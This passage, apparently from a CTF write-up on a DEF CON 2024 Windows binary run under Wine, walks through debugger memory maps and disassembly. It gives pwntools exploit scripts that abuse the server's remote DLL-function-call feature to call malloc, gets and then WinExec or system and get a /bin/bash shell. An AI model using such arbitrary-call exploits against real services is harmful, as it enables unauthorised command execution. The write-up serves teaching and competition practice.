</span></span><span style="display:flex;"><span>    0x79971d89d000     0x79971d8a7000 r--p     a000      <span style="color:#ae81ff">0</span> /opt/wine-stable/lib64/wine/x86_64-unix/ntdll.so
</span></span><span style="display:flex;"><span>    0x79971d8a7000     0x79971d903000 r-xp    5c000   a000 /opt/wine-stable/lib64/wine/x86_64-unix/ntdll.so
</span></span><span style="display:flex;"><span>    0x79971d903000     0x79971d920000 r--p    1d000  <span style="color:#ae81ff">66000</span> /opt/wine-stable/lib64/wine/x86_64-unix/ntdll.so
</span></span><span style="display:flex;"><span>    0x79971d920000     0x79971d922000 r--p     <span style="color:#ae81ff">2000</span>  <span style="color:#ae81ff">82000</span> /opt/wine-stable/lib64/wine/x86_64-unix/ntdll.so
</span></span><span style="display:flex;"><span>    0x79971d922000     0x79971d923000 rw-p     <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">84000</span> /opt/wine-stable/lib64/wine/x86_64-unix/ntdll.so
</span></span><span style="display:flex;"><span>    0x79971d923000     0x79971d95b000 rw-p    <span style="color:#ae81ff">38000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_79971d923<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x79971d95b000     0x79971d95c000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /usr/lib/x86_64-linux-gnu/libdl.so.2
</span></span><span style="display:flex;"><span>    0x79971d95c000     0x79971d95d000 r-xp     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">1000</span> /usr/lib/x86_64-linux-gnu/libdl.so.2
</span></span><span style="display:flex;"><span>    0x79971d95d000     0x79971d95e000 r--p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">2000</span> /usr/lib/x86_64-linux-gnu/libdl.so.2
</span></span><span style="display:flex;"><span>    0x79971d95e000     0x79971d95f000 r--p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">2000</span> /usr/lib/x86_64-linux-gnu/libdl.so.2
</span></span><span style="display:flex;"><span>    0x79971d95f000     0x79971d960000 rw-p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">3000</span> /usr/lib/x86_64-linux-gnu/libdl.so.2
</span></span><span style="display:flex;"><span>    0x79971d960000     0x79971d961000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /usr/lib/x86_64-linux-gnu/libpthread.so.0
</span></span><span style="display:flex;"><span>    0x79971d961000     0x79971d962000 r-xp     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">1000</span> /usr/lib/x86_64-linux-gnu/libpthread.so.0
</span></span><span style="display:flex;"><span>    0x79971d962000     0x79971d963000 r--p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">2000</span> /usr/lib/x86_64-linux-gnu/libpthread.so.0
</span></span><span style="display:flex;"><span>    0x79971d963000     0x79971d964000 r--p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">2000</span> /usr/lib/x86_64-linux-gnu/libpthread.so.0
</span></span><span style="display:flex;"><span>    0x79971d964000     0x79971d965000 rw-p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">3000</span> /usr/lib/x86_64-linux-gnu/libpthread.so.0
</span></span><span style="display:flex;"><span>    0x79971d978000     0x79971d97a000 rw-p     <span style="color:#ae81ff">2000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_79971d978<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x79971d97a000     0x79971d97c000 r--p     <span style="color:#ae81ff">2000</span>      <span style="color:#ae81ff">0</span> /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style="display:flex;"><span>    0x79971d97c000     0x79971d9a6000 r-xp    2a000   <span style="color:#ae81ff">2000</span> /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style="display:flex;"><span>    0x79971d9a6000     0x79971d9b1000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style="display:flex;"><span>    0x79971d9b1000     0x79971d9b2000 ---p     <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">37000</span> /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style="display:flex;"><span>    0x79971d9b2000     0x79971d9b4000 r--p     <span style="color:#ae81ff">2000</span>  <span style="color:#ae81ff">37000</span> /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style="display:flex;"><span>    0x79971d9b4000     0x79971d9b6000 rw-p     <span style="color:#ae81ff">2000</span>  <span style="color:#ae81ff">39000</span> /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style="display:flex;"><span>    0x79971d9b6000     0x79971d9b7000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/bin/wine64
</span></span><span style="display:flex;"><span>    0x79971d9b7000     0x79971d9b8000 r-xp     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">1000</span> /opt/wine-stable/bin/wine64
</span></span><span style="display:flex;"><span>    0x79971d9b8000     0x79971d9b9000 r--p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">2000</span> /opt/wine-stable/bin/wine64
</span></span><span style="display:flex;"><span>    0x79971d9b9000     0x79971d9ba000 r--p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">2000</span> /opt/wine-stable/bin/wine64
</span></span><span style="display:flex;"><span>    0x79971d9ba000     0x79971d9bb000 rw-p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">3000</span> /opt/wine-stable/bin/wine64
</span></span><span style="display:flex;"><span>    0x79971d9bb000     0x79971d9bc000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/bin/wine64-preloader
</span></span><span style="display:flex;"><span>    0x79971d9bc000     0x79971d9be000 r-xp     <span style="color:#ae81ff">2000</span>   <span style="color:#ae81ff">1000</span> /opt/wine-stable/bin/wine64-preloader
</span></span><span style="display:flex;"><span>    0x79971d9be000     0x79971d9bf000 r--p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">3000</span> /opt/wine-stable/bin/wine64-preloader
</span></span><span style="display:flex;"><span>    0x79971d9bf000     0x79971d9c1000 rw-p     <span style="color:#ae81ff">2000</span>   <span style="color:#ae81ff">3000</span> /opt/wine-stable/bin/wine64-preloader
</span></span><span style="display:flex;"><span>    0x7ffc5b674000     0x7ffc5b695000 rw-p    <span style="color:#ae81ff">21000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>stack<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffc5b749000     0x7ffc5b74d000 r--p     <span style="color:#ae81ff">4000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>vvar<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffc5b74d000     0x7ffc5b74f000 r-xp     <span style="color:#ae81ff">2000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>vdso<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe000000     0x7ffffe100000 rw-p   <span style="color:#ae81ff">100000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe000<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe100000     0x7ffffe102000 ---p     <span style="color:#ae81ff">2000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe100<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe102000     0x7ffffe300000 rw-p   1fe000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe102<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe300000     0x7ffffe311000 r--p    <span style="color:#ae81ff">11000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/lib64/wine/x86_64-windows/apisetschema.dll
</span></span><span style="display:flex;"><span>    0x7ffffe311000     0x7ffffe320000 ---p     f000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe311<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe320000     0x7ffffe33a000 rw-p    1a000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe320<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe33a000     0x7ffffe340000 ---p     <span style="color:#ae81ff">6000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe33a<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe340000     0x7ffffe3fa000 r--p    ba000      <span style="color:#ae81ff">0</span> /opt/wine-stable/share/wine/nls/locale.nls
</span></span><span style="display:flex;"><span>    0x7ffffe3fa000     0x7ffffe400000 ---p     <span style="color:#ae81ff">6000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe3fa<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe400000     0x7ffffe402000 r--p     <span style="color:#ae81ff">2000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/share/wine/nls/l_intl.nls
</span></span><span style="display:flex;"><span>    0x7ffffe402000     0x7ffffe410000 ---p     e000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe402<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe410000     0x7ffffe421000 r--p    <span style="color:#ae81ff">11000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/share/wine/nls/c_1252.nls
</span></span><span style="display:flex;"><span>    0x7ffffe421000     0x7ffffe430000 ---p     f000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe421<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe430000     0x7ffffe441000 r--p    <span style="color:#ae81ff">11000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/share/wine/nls/c_437.nls
</span></span><span style="display:flex;"><span>    0x7ffffe441000     0x7ffffe450000 ---p     f000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe441<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe450000     0x7ffffe550000 rw-p   <span style="color:#ae81ff">100000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe450<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe550000     0x7ffffe889000 r--p   <span style="color:#ae81ff">339000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/share/wine/nls/sortdefault.nls
</span></span><span style="display:flex;"><span>    0x7ffffe889000     0x7ffffe890000 ---p     <span style="color:#ae81ff">7000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe889<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe890000     0x7ffffe89f000 r--p     f000      <span style="color:#ae81ff">0</span> /opt/wine-stable/share/wine/nls/normnfc.nls
</span></span><span style="display:flex;"><span>    0x7ffffe89f000     0x7ffffe8a0000 ---p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe89f<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe8a0000     0x7ffffe8ba000 rw-p    1a000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe8a0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe8ba000     0x7ffffe8c0000 ---p     <span style="color:#ae81ff">6000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe8ba<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe8c0000     0x7ffffe8d1000 r--p    <span style="color:#ae81ff">11000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/share/wine/nls/c_20127.nls
</span></span><span style="display:flex;"><span>    0x7ffffe8d1000     0x7fffffdb0000 ---p  14df000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe8d1<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7fffffdb0000     0x7fffffff0000 rw-p   <span style="color:#ae81ff">240000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7fffffdb0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>0xffffffffff600000 0xffffffffff601000 --xp     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>vsyscall<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>pwndbg&gt; 
</span></span></code></pre></div><p>And here is the output we got:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>╭─<span style="color:#f92672">[</span>nvm<span style="color:#f92672">]</span> as kyrie in ~/CTF/2024/defcon/durnk/handout                                                                                                           17:33:31
</span></span><span style="display:flex;"><span>╰──➤ wine test.exe
</span></span><span style="display:flex;"><span>WinMain:                00000001400015a1
</span></span><span style="display:flex;"><span>kernel32.dll:           00006fffffa80000
</span></span><span style="display:flex;"><span>GetProcAddress:         00006fffffa98a60
</span></span><span style="display:flex;"><span>msvcrt.dll:             000000007bb50000
</span></span><span style="display:flex;"><span>ntdll.dll:              00006fffffc50000
</span></span><span style="display:flex;"><span>Stack:                  00007ffffe2ffe4c
</span></span><span style="display:flex;"><span>Heap:                   00007ffffe8a0c70
</span></span></code></pre></div><p>There are a few things to notice:</p>
<ul>
<li>No readable/writable/executable (rwx) memory</li>
<li>The windows executable (test.exe) with its sections is mapped beginning at 0x140000000</li>
<li>There are many libraries expected in a standard linux process</li>
<li>There are other libraries you do not expect at all on a linux system, like kernel32.dll, ntdll.dll, msvcrt.dll and ntdll.so</li>
<li>The Heap and The Stack quite close</li>
<li>There is a region marked as stack (at 0x7ffc5b674000), but it’s different from the stack used by the application (the printdata output was 0x7ffffe2ffe4c)</li>
<li>Same goes for the heap: gdb sees one at 0x5555562bb000 , but the application uses a different heap beginning at 0x7ffffe8a0c70</li>
</ul>
<pre tabindex="0"><code>pwndbg&gt; x/2i 0x7ffff7d147e2
   0x7ffff7d147e2 &lt;__GI___libc_read+18&gt;:        cmp    rax,0xfffffffffffff000
   0x7ffff7d147e8 &lt;__GI___libc_read+24&gt;:        ja     0x7ffff7d14840 &lt;__GI___libc_read+112&gt;
</code></pre><p>The most important thing is that we are in the <code>__GI___libc_read</code> function, as we would expect in a regular Linux process that waits for some input.</p>
<p>If you restart the process and look at it again, you will see that the all libraries are mapped to different addresses each time, while the addresses of the <code>msvcrt.dll</code> libraries mostly remain the same.</p>
<p>It&rsquo;s called the LoadLibrary function and passes the <code>msvcrt.dll</code> as an argument to get the base of the <code>msvcrt.dll</code> module.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    HMODULE msvcrt <span style="color:#f92672">=</span> <span style="color:#a6e22e">LoadLibrary</span>(<span style="color:#e6db74">&#34;msvcrt.dll&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;msvcrt.dll:</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,msvcrt);    
</span></span></code></pre></div><p>In gdb, <code>msvcrt.dll</code> is passed to <code>rcx</code> register while <code>rax</code> store the address of <code>LoadLibrary</code> function</p>
<pre tabindex="0"><code>─────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────
   0x7bb74ae6     add    rsp, 0x20     RSP =&gt; 0x7ffffe2ffe10 (0x7ffffe2ffdf0 + 0x20)
   0x7bb74aea     pop    r12           R12 =&gt; 16
   0x7bb74aec     ret                                &lt;0x14000160e&gt;
    ↓
   0x14000160e    lea    rcx, [rip + 0x7a2e]               RCX =&gt; 0x140009043 ◂— &#39;msvcrt.dll&#39;
   0x140001615    mov    rax, qword ptr [rip + 0xbc10]     RAX, [0x14000d22c] =&gt; 0x6fffffa8ea14 ◂— lea rsp, [rsp]
 ► 0x14000161c    call   rax                         &lt;0x6fffffa8ea14&gt;
</code></pre><p>Finally, let&rsquo;s get our hands dirty.</p>
<h2 id="source-code-overview-3">Source-code overview</h2>
<p><img src="https://imgur.com/4rgNU3q.png" alt="image"></p>
<p>First, it uses the DLL specified by us to call the LoadLibraryA function.</p>
<p><img src="https://imgur.com/PpxMeux.png" alt="image"></p>
<p>Respond to us with the resulting module handle. Using the API name specified on the client side and the module handle in the result of step 1, call the GetProcAddress function on the server side to get the function address</p>
<p><img src="https://imgur.com/CVlVrYr.png" alt="image"></p>
<p>Finally, using the 64-bit integer specified by the client side as an argument, the function address of the result of step 2 is called on the server side. Returns the result of the call to the client.</p>
<p>Note that the distribution file also includes <code>kernel32.dll</code> and <code>msvcrt.dll</code>.</p>
<h2 id="solution-2">Solution</h2>
<h3 id="method-1">Method 1</h3>
<ol>
<li>I call the malloc function of msvcrt.dll with an appropriate size as an argument to allocate memory and obtain the address.</li>
<li>I call the gets function of msvcrt.dll with the address in step 1 as an argument, then enter the command <code>/bin/bash</code> =))</li>
<li>Call <code>WinExec</code> and pass the address of the string as an argument, and we get a shell.</li>
</ol>
<p><img src="https://imgur.com/QNOdSBQ.png" alt="image"></p>
<p>I founded that <code>/root/.wine/dosdevices/z:</code> is just a symlink to <code>/</code></p>
<p><img src="https://imgur.com/JAQqaBa.png" alt="image"></p>
<p>Since the original <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">WinExec</a> function is a function that takes two arguments, it seems that an indefinite value will be entered in the second argument uCmdShow in this execution method. However, it may be that the uCmdShow argument is a value that does not affect programs.</p>
<p><img src="https://imgur.com/GAKJAea.png" alt="image"></p>
<h3 id="method-2">Method 2</h3>
<p>In this way, I do the same as above, but instead of calling the WinExec function, I call <code>system</code> function of the module msvcrt.dll</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0&#34;</span>
</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;wine&#34;</span>, <span style="color:#e6db74">&#34;challenge.exe&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> remote(HOST, int(PORT))
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">0x100</span>)<span style="color:#f92672">.</span>encode()) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result: &#39;</span>)
</span></span><span style="display:flex;"><span>out <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>print(out)
</span></span><span style="display:flex;"><span>heap_addr <span style="color:#f92672">=</span> int(out<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>print(hex(heap_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;gets&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/bash&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;system&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>But when running, it failed and returned -1, I don&rsquo;t know why it happened.</p>
<p>According to Microsoft&rsquo;s system function documentation, if calling the system function results in an error, it returns -1 and sets the error code to the global variable <code>errno</code>.</p>
<blockquote>
<p>If command is NULL and the command interpreter is found, returns a nonzero value. If the command interpreter isn&rsquo;t found, returns 0 and sets errno to ENOENT. If command isn&rsquo;t NULL, system returns the value that is returned by the command interpreter. It returns the value 0 only if the command interpreter returns the value 0. A return value of -1 indicates an error, and errno is set to one of the following values.</p>
</blockquote>
<p>So I used the <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/get-errno?view=msvc-170">_get_errno</a> function to to get the current value of the errno global variable.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0&#34;</span>
</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;wine&#34;</span>, <span style="color:#e6db74">&#34;challenge.exe&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> remote(HOST, int(PORT))
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">0x100</span>)<span style="color:#f92672">.</span>encode()) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result: &#39;</span>)
</span></span><span style="display:flex;"><span>out <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>heap_addr <span style="color:#f92672">=</span> int(out<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>print(hex(heap_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;gets&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/bash</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;system&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">0x100</span>)<span style="color:#f92672">.</span>encode()) 
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result: &#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result: &#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result: &#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result: &#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>out <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>print(out)
</span></span><span style="display:flex;"><span>errno_ <span style="color:#f92672">=</span> int(out<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>print(hex(errno_))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;_get_errno&#39;</span>)
